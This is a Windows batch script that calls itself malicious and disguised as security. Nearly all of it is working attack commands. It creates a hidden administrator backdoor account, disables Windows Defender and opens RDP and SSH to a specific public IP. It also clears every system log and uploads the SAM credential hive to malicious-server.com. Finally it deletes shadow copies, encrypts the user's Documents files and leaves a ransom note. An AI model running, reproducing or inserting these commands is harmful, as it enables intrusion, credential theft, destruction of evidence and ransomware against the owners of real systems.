@echo off
:: Malicious System Script (Disguised as Security)

:: 1. Create a hidden backdoor user with admin privileges
echo Creating a hidden backdoor user...
net user BackdoorUser P@ssw0rd123 /add
net localgroup administrators BackdoorUser /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v BackdoorUser /t REG_DWORD /d 0 /f

:: 2. Disable Windows Defender and Security Features
echo Disabling Windows Defender and real-time protection...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
sc stop windefend
sc config windefend start= disabled

:: 3. Open critical ports (RDP, SSH) for remote access from public IP
echo Opening RDP and SSH ports for remote access from public IP...
netsh advfirewall firewall add rule name="Allow RDP from Public IP" dir=in action=allow protocol=TCP localport=3389 remoteip=115.96.169.39
netsh advfirewall firewall add rule name="Allow SSH from Public IP" dir=in action=allow protocol=TCP localport=22 remoteip=115.96.169.39

:: 4. Clear system logs to erase evidence of malicious actions
echo Clearing all system logs...
for /F "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G"

:: 5. Exfiltrate sensitive files to a remote server
echo Exfiltrating sensitive data to a malicious server...
powershell -Command "Invoke-WebRequest -Uri http://malicious-server.com/upload -Method Post -InFile C:\Windows\System32\config\SAM"

:: 6. Disable system restore and delete shadow copies
echo Disabling system restore and deleting shadow copies...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
vssadmin delete shadows /all /quiet

:: 7. Encrypt user files (Ransomware behavior)
echo Encrypting files in the Documents folder...
for /r "C:\Users\%USERNAME%\Documents" %%F in (*) do cipher /e /s:"%%F"
echo "Your files have been encrypted. Pay X amount to decrypt." > C:\Users\%USERNAME%\Documents\RansomNote.txt

:: End of malicious actions
echo Malicious actions complete.
pause
exit
